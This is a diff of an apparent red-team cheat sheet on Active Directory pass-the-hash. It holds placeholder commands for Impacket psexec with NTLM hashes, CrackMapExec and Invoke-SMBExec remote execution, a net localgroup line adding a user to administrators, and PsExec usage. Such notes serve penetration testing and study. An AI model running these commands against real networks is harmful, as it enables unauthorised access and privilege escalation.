@@ -245,14 +245,12 @@ Find-WMILocalAdminAccess
 Find-PSRemotingLocalAdminAccess
 ```
 
-
-
 ## Pass the hash
-#### Psexec
-- Empty LM hash: ```aad3b435b51404eeaad3b435b51404ee```
-- Doesn't seem to work all the time though!
+#### Impacket
+- Use the empty lm hash ```00000000000000000000000000000000```
+- https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries
 ```
-.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <LM HASH>:<NTLM HASH> cmd.exe
+.\psexec_windows.exe -hashes <LM HASH>:<NTLM HASH> <DOMAIN>/<USER>@<COMPUTERNAME>
 ```
 
 #### Crackmapexec
@@ -266,6 +264,13 @@ cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>
 - Can use the command ```net localgroup administrators <DOMAIN>\<USERNAME> /add``` and do ```enter-pssession``` after to connect 
 ```
 Invoke-SMBExec -Target <COMPUTERNAME> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM HASH> -Command <COMMAND> -Verbose
+```
+
+#### Psexec
+- Seems to only work with password or after a overpass the hash attack with Mimikatz!
+```
+.\PsExec64.exe \\<COMPUTERNAME> -accepteula -u <DOMAIN>\<ADMINISTRATOR -p <PASSWORD> cmd.exe
+.\PsExec64.exe \\<COMPUTERNAME> -accepteula 
 ```
 
 ### Overpass The Hash
